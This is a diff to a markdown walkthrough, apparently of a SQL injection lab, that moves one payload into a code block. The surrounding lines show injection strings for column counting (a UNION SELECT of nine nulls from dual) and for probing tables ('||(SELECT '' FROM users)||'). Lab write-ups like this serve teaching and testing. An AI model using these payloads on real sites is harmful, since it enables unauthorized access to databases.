@@ -55,7 +55,13 @@ ad'union select null,null,null,null,null,null,null,null,null from dual--
 ```
 
 when we query nine column it says successfully sent request code, so we should use nine column from now in our sql query.
-by submitting `'||(SELECT '' FROM table)||'` it gives error and querying using
+by submitting
+
+```
+'||(SELECT '' FROM table)||'
+```
+
+it gives error and querying using
 
 ```
 ad'||(SELECT '' FROM users)||'
